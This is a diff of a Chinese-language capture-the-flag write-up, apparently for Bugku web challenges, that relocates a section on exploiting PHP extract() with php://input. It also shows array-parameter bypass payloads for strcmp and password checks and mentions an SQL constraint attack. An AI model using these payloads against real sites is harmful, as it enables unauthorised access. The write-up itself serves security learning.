@@ -604,41 +604,6 @@ strcmp 函数比较可以用数组绕过
 综上,构造 payload:`?v1=s878926199a&v2=s155964671a&v3[]=0`
  或者 `?v1[]=0&v2[]=1&v3[]=0`
  得到 flag
-## web8 
-```php
-<?php  
-extract($_GET);  
-if (!empty($ac))  
-{  
-	$f = trim(file_get_contents($fn));  
-	if ($ac === $f)  
-	{  
-		echo "<p>This is flag:" ." $flag</p>";  
-	}  
-	else  
-	{  
-		echo "<p>sorry!</p>";  
-	}  
-}  
-?>  
-```
-php://input 利用
-```
-GET /web8/?ac=1&fn=php://input HTTP/1.1
-Host: 123.206.87.240:8002
-Pragma: no-cache
-Cache-Control: no-cache
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: PHPSESSID=n5l7221c9hfe7tkit4ct96b6u6994uub
-Connection: close
-Content-Length: 1
-
-1
-```
 ## login1(SKCTF)
 hint: SQL 约束攻击
 没有限制用户名的长度,可以进行 SQL 约束攻击
@@ -703,9 +668,43 @@ Connection: close
 
 passwd%5B%5D=2
 ```
-或者 sha1 碰撞
+得到 flag
+## web8 
+```php
+<?php  
+extract($_GET);  
+if (!empty($ac))  
+{  
+	$f = trim(file_get_contents($fn));  
+	if ($ac === $f)  
+	{  
+		echo "<p>This is flag:" ." $flag</p>";  
+	}  
+	else  
+	{  
+		echo "<p>sorry!</p>";  
+	}  
+}  
+?>  
 ```
+php://input 利用
 ```
+GET /web8/?ac=1&fn=php://input HTTP/1.1
+Host: 123.206.87.240:8002
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=n5l7221c9hfe7tkit4ct96b6u6994uub
+Connection: close
+Content-Length: 1
+
+1
+```
+## 
 ## 求 Getshell
 后缀名黑名单检测和类型检测
 
@@ -713,7 +712,7 @@ passwd%5B%5D=2
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTU2NjY5MTA2OCwtMTAwMjU3Mjc3NiwyMD
+eyJoaXN0b3J5IjpbLTM1MDc2MDQ1NSwtMTAwMjU3Mjc3NiwyMD
 Y4NDg4MDE2LDk2OTgyNzIwNywxMjk1ODkxMDksMzczMDQ5MzM3
 LC0xNDI4NzM2NzQ3LDQ2MDYxODUzNywtNzA0MzQzMjk4LDIwND
 UxNzc0MzgsLTU2MTc5MTE2OSwtOTM3NTE2MTk5LC0xMTU3ODI3
